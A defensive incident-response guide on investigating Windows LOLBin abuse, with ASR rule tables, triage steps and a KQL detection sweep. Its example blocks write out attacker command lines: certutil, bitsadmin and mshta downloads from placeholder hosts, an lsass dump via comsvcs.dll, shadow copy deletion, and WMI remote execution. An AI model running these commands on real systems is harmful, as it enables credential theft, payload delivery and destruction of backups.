# LOLBin abuse — investigation

## What are LOLBins?

Living Off the Land Binaries — legitimate Windows tools abused by attackers to avoid dropping their own malware. They are signed by Microsoft and present on every device, so the binary's name, signature and hash tell you nothing. Detection must be behavioural — what the binary is *doing*, not what it *is*.

> The question is never "is this a real Windows binary?" — it's "is this binary doing something it has no business doing?"

Defender isn't blind to these tools: several attack surface reduction (ASR) rules target exactly this behaviour (see Was it blocked?). Whether they are on, and in block or audit mode, is the customer's configuration.

Because the binary is a Windows file:
- Its hash is on every device. A hash sweep tells you nothing, and a hash block would stop Windows using its own tool (see Scope across the estate).
- Defender's Stop and Quarantine File can't act on it, and Live Response `remediate` on its process deletes the image file, which here is the Windows binary. The [playbook](playbook.md) says what to do instead.
- "This tool is used here every day" is the expected answer for a LOLBin, not evidence that this run was benign (see Baseline the pattern, not the binary).

The [playbook](playbook.md) gives the order of actions. This page explains what you are looking at and how to scope it. General process guidance (decoding, hidden parents, following a process, renamed binaries) is in the [suspicious process investigation](../02-suspicious-process/investigation.md); this page links to it rather than repeating it.

---

## Was it blocked?

Check the alert's detection status and the device's ASR events (`DeviceEvents`, `ActionType` starting with `Asr`, from T0) first, as in the [suspicious process investigation](../02-suspicious-process/investigation.md#was-it-blocked). An action type ending in `Blocked` means the rule stopped that one action; `Audited` means the rule is in audit mode and the action ran.

ASR rules this scenario meets most often (each logs an `...Audited` and an `...Blocked` action type):

| Rule (Microsoft name) | Action type prefix | What it tells you here |
|---|---|---|
| Block credential stealing from the Windows local security authority subsystem | `AsrLsassCredentialTheft` | Something tried to read lsass memory (for example `rundll32.exe` with `comsvcs.dll`). Microsoft: the rule "blocks access to LSASS process memory. It doesn't block processes from running." |
| Block process creations originating from PSExec and WMI commands | `AsrPsexecWmiChildProcess` | A process was started through WMI (`wmic process call create`, `Invoke-CimMethod`, or WMI from another host) or PsExec |
| Block all Office applications from creating child processes | `AsrOfficeChildProcess` | An Office app started `mshta.exe`, PowerShell or another LOLBin. Enforced only if Office is installed under `%ProgramFiles%` or `%ProgramFiles(x86)%` |
| Block use of copied or impersonated system tools | `AsrAbusedSystemTool` | A copy of a `System32` or `SysWOW64` tool ran from another location; Microsoft: "even if the files are signed by Microsoft" |
| Block execution of potentially obfuscated scripts | `AsrObfuscatedScript` | Obfuscated PowerShell |
| Block JavaScript or VBScript from launching downloaded executable content | `AsrScriptExecutableDownload` | A script started something it downloaded |

- Microsoft's table shows the LSASS, Office child-process, PsExec/WMI and copied-tools rules raise no EDR alert in block mode. Check `DeviceEvents`, not only the alerts queue.
- A `Blocked` event covers that one action. A dump command that the LSASS rule blocked still means someone ran a dump command; the playbook still escalates it.
- `AsrOfficeChildProcessBlocked` means the document was opened and its child was stopped: delivery was attempted, not avoided. The document is still the delivery file to find.
- No ASR event doesn't mean the rule was on.

---

## powershell.exe

**Malicious patterns:**
```
powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...
powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Temp\a8f3b.ps1
```
**Red flags:** `-enc`, `-nop`, `-w hidden`, `IEX`, `DownloadString`, `Reflection.Assembly::Load`, `Start-BitsTransfer` (a download through BITS that never starts `bitsadmin.exe`), `Invoke-CimMethod` or `Invoke-WmiMethod` with `Win32_Process` (WMI execution; with `-ComputerName`, on another host)

These switches are a reason to decode, not a verdict: management tools use them too. Decode any `-e`, `-ec`, `-enc` or `-EncodedCommand` string as UTF-16LE before you judge it, on your analysis machine, and never run the result ([Decode before you judge](../02-suspicious-process/investigation.md#decode-before-you-judge)). The first example above is one: its verdict comes from the decoded text, not the switches.

A decoded command that opens a network connection to an external host (for example a TCP client object) may be a reverse shell. The playbook escalates it.

---

## certutil.exe

**Malicious patterns:**
```
certutil.exe -urlcache -split -f "http://185.x.x.x/payload.exe" C:\Users\Public\update.exe
certutil.exe -verifyctl -f "https://185.x.x.x/payload.exe" C:\Users\Public\update.exe
certutil.exe -URL "https://185.x.x.x/payload.exe"
certutil.exe -decode C:\Temp\encoded.txt C:\Temp\payload.exe
certutil.exe -decodehex C:\Temp\encoded.hex C:\Temp\payload.exe
```
**Red flags:** `-urlcache`, `-verifyctl` or `-URL` with a URL; `-decode` or `-decodehex`; any URL in arguments

**A local `-decode` is not a benign sign.** The download happened in an earlier step; the decode is local by nature. MITRE ATT&CK T1140 lists many groups using `certutil -decode` to turn a base64 file on the victim's disk into a payload. Find where the input file came from: `FileOriginUrl` on its creation event, or the process that wrote it. Then treat the output file as the payload.

The sweep below matches `-decodehex` only when the command line also holds a URL: `has` matches whole terms, and `decodehex` is a different term from `decode`. Read the command line yourself.

---

## rundll32.exe

**Malicious patterns:**
```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Public\lsass.dmp full
rundll32.exe C:\Users\user\AppData\Local\Temp\a9f3bc.dll,DllMain
```
> `rundll32.exe` with `comsvcs.dll` in the command line, whatever follows it, is a credential dump. LOLBAS documents it as calling the `MiniDump` export to dump lsass memory. Escalate immediately.

- The dump file holds the stolen credentials. Don't download or delete it; follow step 7 of the [credential compromise playbook](../06-credential-compromise/playbook.md). Every account with a session on the device is exposed (step 8 there).
- A DLL that rundll32 ran from `Temp`, `AppData` or another user-writable folder is the payload. Preserve it; don't act on `rundll32.exe`.

---

## mshta.exe

**Malicious patterns:**
```
mshta.exe http://185.x.x.x/payload.hta
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc..."")(window.close)"
WINWORD.EXE → mshta.exe http://malicious.com/stage1.hta
```
**Red flags:** Any URL argument, `vbscript:`/`javascript:` inline, parent is Office app

- Office parent: check the Office child-process ASR rule (Was it blocked?). `Blocked` means an attempted delivery; `Audited` or no event means mshta ran. Either way, the open document is the delivery file.
- `explorer.exe` parent with a URL or inline script: possibly a command pasted into the Run dialog ([ClickFix](../13-clickfix/investigation.md)).
- Decode any encoded content in the inline script before you judge it.

---

## wmic.exe

**Malicious patterns:**
```
wmic.exe /node:"192.168.1.50" process call create "cmd.exe /c powershell -enc..."
wmic.exe process call create "C:\Users\Public\svchost.exe"
wmic.exe shadowcopy delete
```
**Red flags:** `process call create`, `shadowcopy delete`, `/node:` targeting internal IPs

**WMIC is gone from current Windows 11.** Microsoft: "WMIC is removed and is no longer available as a Feature on Demand (FoD) on Windows 11, version 24H2 and above." WMI itself isn't affected, and PowerShell supersedes WMIC for it. So:
- On Windows 11 24H2 and later, no `wmic.exe` hit says nothing about WMI abuse, and a `wmic.exe` run at all is unusual: find where the binary came from.
- On Windows 10, Windows Server and older Windows 11, `wmic.exe` is still present.
- The same actions through PowerShell look like this. `-ComputerName` means another host:
```
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c ..."} -ComputerName 192.168.1.50
Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
```

**The other end of `/node:` or `-ComputerName`.** The command runs on the target device, where the new process can show `WmiPrvSE.exe` as its parent ([Hidden parents](../02-suspicious-process/investigation.md#hidden-parents)). The target is in scope: look on it, around the time of the command, for processes whose parent is `WmiPrvSE.exe` and for `AsrPsexecWmiChildProcess` events. Then check the account that ran it ([credential compromise investigation, Remote execution tools](../06-credential-compromise/investigation.md#remote-execution-tools)).

---

## regsvr32.exe

**Malicious patterns:**
```
regsvr32.exe /s /n /u /i:http://185.x.x.x/payload.sct scrobj.dll
```
**Red flags:** `/i:` with URL, `scrobj.dll`, DLL in `Temp`/`AppData`

Record the scriptlet URL: it is the IOC to scope and block. A DLL that regsvr32 registered from a user-writable folder is the payload; preserve it.

---

## bitsadmin.exe

**Malicious patterns:**
```
bitsadmin.exe /transfer WindowsUpdate http://185.x.x.x/update.exe C:\Public\update.exe
bitsadmin.exe /SetNotifyCmdLine job1 C:\Temp\payload.exe NULL
bitsadmin /create 1 & bitsadmin /addfile 1 https://185.x.x.x/update.exe C:\Users\Public\update.exe & bitsadmin /RESUME 1 & bitsadmin /complete 1
Start-BitsTransfer -Source "https://185.x.x.x/update.exe" -Destination "C:\Users\Public\update.exe"
```
**Red flags:** `/transfer` or `/addfile` with URL, `SetNotifyCmdLine`, `Start-BitsTransfer` or `-NotifyCmdLine` in a PowerShell command line

**The job outlives the command.** `bitsadmin.exe` and the PowerShell BITS cmdlets hand a job to the Background Intelligent Transfer Service (BITS). Microsoft: BITS "handles network interruptions, pausing and automatically resuming transfers, even after a reboot." MITRE ATT&CK T1197 says that on job completion or error BITS launches the notify command from `svchost.exe -k netsvcs -s BITS`, and lists BITS jobs under Persistence. So:
- `bitsadmin.exe` having exited doesn't mean the download stopped or failed. The job may still be queued.
- A notify command can start a payload later, with `svchost.exe` as its parent.
- A job created with `Start-BitsTransfer` never starts `bitsadmin.exe`.
- The Microsoft pages checked don't say which process Defender records for a job's connections and file writes. Look at events from `bitsadmin.exe` and from `svchost.exe` with `BITS` in its command line (VERIFY (tenant)). LOLBAS lists "bitsadmin creates new files" as an IOC.

**Listing and cancelling jobs.** Microsoft documents no BITS job list in the investigation package or in the Live Response commands. Whether the Live Response `persistence` command ("Shows all known persistence methods on the device") includes BITS jobs is not stated (VERIFY (tenant)). Someone with administrator rights on the device runs one of these and sends you the output:
- `bitsadmin /list /allusers /verbose`. Microsoft: `/allusers` "Lists jobs for all users. You must have administrator privileges to use this parameter."
- `Get-BitsTransfer -AllUsers` (also needs administrative credentials).

`bitsadmin /cancel PASTE_JOB_ID_HERE` "removes the job from the transfer queue and deletes all temporary files associated with the job". Record the job, its URLs, its target files and its notify command before anyone cancels it.

---

## Hidden parents for LOLBins

The parent recorded for a LOLBin is not always the program that wanted it to run ([Hidden parents](../02-suspicious-process/investigation.md#hidden-parents)).

| Parent | Spawning | What it means |
|--------|----------|---------------|
| `WmiPrvSE.exe` | A LOLBin, PowerShell or a script host | Started through WMI, locally or from another host. Find the caller |
| `explorer.exe` | `powershell.exe`, `mshta.exe` or `cmd.exe` with a URL or encoded arguments | Possible Run-dialog paste ([ClickFix](../13-clickfix/investigation.md)) |
| `svchost.exe -k netsvcs -s BITS` | Anything | A BITS notify command (see bitsadmin.exe) |
| `svchost.exe` (other) | A LOLBin or script host | A scheduled task or service; check [persistence](../04-persistence-detected/investigation.md) |
| Office app | A LOLBin or script host | A document; check the Office ASR rule and find the document |

---

## Follow the LOLBin

Link the LOLBin to what it did on its `ProcessId` and `ProcessCreationTime`, never on the name: `certutil.exe` or `rundll32.exe` run many times a day on most devices ([Follow the process](../02-suspicious-process/investigation.md#follow-the-process)). The sweep below doesn't return the columns you need; add `FolderPath, ProcessId, ProcessCreationTime, InitiatingProcessId, InitiatingProcessCreationTime, InitiatingProcessCommandLine, InitiatingProcessParentFileName, ProcessVersionInfoOriginalFileName, SHA1` to its `project` line in your portal.

- **Files:** the downloaded file, the decoded output, the DLL, scriptlet or HTA it ran, and any dump file. Record path and SHA1 of each. These are the payloads you preserve, scope and later remove.
- **Network:** every remote domain, IP and port. A connection that network protection blocked can still be logged as `ConnectionSuccess`.
- **BITS:** also check `svchost.exe` with `BITS` in its command line, and the job list (see bitsadmin.exe).
- **Still running?** Process events record what started, not what is running now. Use the investigation package and Live Response `processes` and `connections` ([Follow the process](../02-suspicious-process/investigation.md#follow-the-process)).

---

## Renamed and copied LOLBins

Every branch of the sweep matches `FileName`. A copy of `certutil.exe` renamed `update.exe`, or run from `C:\Users\Public`, isn't matched by name. Compare `FileName` with `ProcessVersionInfoOriginalFileName`, and check `FolderPath` ([Process name spoofing](../02-suspicious-process/investigation.md#process-name-spoofing)). VERIFY (tenant) the original file name values for system binaries before you rely on a mismatch. The ASR rule "Block use of copied or impersonated system tools" (`AsrAbusedSystemTool`) is a second signal.

---

## Baseline the pattern, not the binary

"Is certutil used on this device?" is always yes. Ask instead:
- Has this command-line shape (the same switches, the same kind of target, from the same parent, under the same account) run on this device or elsewhere in the estate before T0?
- Is there a named, documented reason for it: a script, a product or a change record the customer can show you?

Earlier runs of the same pattern are scope (more devices and an earlier T0 to investigate), not proof that it is benign. Advanced Hunting holds 30 days of native data.

---

## Scope across the estate

- **The LOLBin itself:** don't run a hash sweep or add a hash indicator for it; its hash is on every device. Run the sweep below estate-wide with the same T0. It covers T0 − 24h to T0 + 24h; for a longer window, run it again with an earlier and a later T0. Search for the pattern: the URL or domain, the output file name, the switch set.
- **A payload it fetched, decoded or ran (EXE, DLL, script, HTA, scriptlet):** run the [hash sweep](../05-malicious-file/investigation.md#hash-across-estate) with its SHA1. SHA256 is usually empty in these tables. Look up the hash and the domains with [threat intel enrichment](../../reference/threat-intel-enrichment.md); search by hash or domain, and don't upload the file itself to a public service.
- **Domains and IPs** from the command line or the decoded text: search `DeviceNetworkEvents` across the estate.
- **WMI targets** (`/node:`, `-ComputerName`): each target device is in scope.

---

## KQL — master LOLBin sweep

What it doesn't catch: on Windows 11 24H2 and later its `wmic.exe` clause can't match, and WMI or BITS abuse through PowerShell (`Invoke-CimMethod`, `Start-BitsTransfer`) isn't covered. It also misses `-decodehex` without a URL and renamed copies of the binaries. Its rundll32 `AppData` and `Temp` terms make it noisy estate-wide. Read every command line in the alert's process tree yourself.

```kql
// LOLBin abuse — master sweep across all known Living Off the Land binaries
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1218.005, T1218.010, T1218.011, T1059.001, T1059.007, T1105, T1140, T1047, T1197, T1003.001, T1490
// Covers: certutil, PowerShell, mshta, regsvr32, rundll32, wmic, bitsadmin
// Run estate-wide as a daily hunt (set T0 to now()) or scope to a specific device
// "has" matches whole terms, so "http" does not match https:// URLs; both are listed
// Ref: docs/scenarios/07-lolbin-abuse/investigation.md, docs/scenarios/02-suspicious-process/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceProcessEvents
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where (
    // certutil downloading or decoding
    (FileName =~ "certutil.exe"
        and ProcessCommandLine has_any("-urlcache", "-decode", "http", "https"))
    // PowerShell suspicious flags (-e / -ec abbreviate -EncodedCommand, -w h = -WindowStyle Hidden)
    or (FileName in~ ("powershell.exe", "pwsh.exe")
        and ProcessCommandLine has_any(
            "-e", "-ec", "-enc", "-EncodedCommand", "IEX",
            "DownloadString", "-w h", "-w hidden", "Reflection.Assembly"))
    // mshta — almost never legitimate in modern environments
    or (FileName =~ "mshta.exe"
        and ProcessCommandLine has_any("http", "https", "vbscript:", "javascript:"))
    // regsvr32 remote scriptlet (Squiblydoo / AppLocker bypass)
    or (FileName =~ "regsvr32.exe"
        and ProcessCommandLine has_any("http", "https", "scrobj.dll", "/i:"))
    // rundll32 credential dump or suspicious DLL
    or (FileName =~ "rundll32.exe"
        and ProcessCommandLine has_any("comsvcs", "MiniDump", "javascript:", "AppData", "Temp"))
    // wmic remote execution or shadow deletion
    or (FileName =~ "wmic.exe"
        and ProcessCommandLine has_any("process call create", "shadowcopy delete", "/node:"))
    // bitsadmin download or notification command
    or (FileName =~ "bitsadmin.exe"
        and ProcessCommandLine has_any("/transfer", "http", "https", "SetNotifyCmdLine"))
)
| project Timestamp, DeviceName, AccountName, FileName,
    ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```
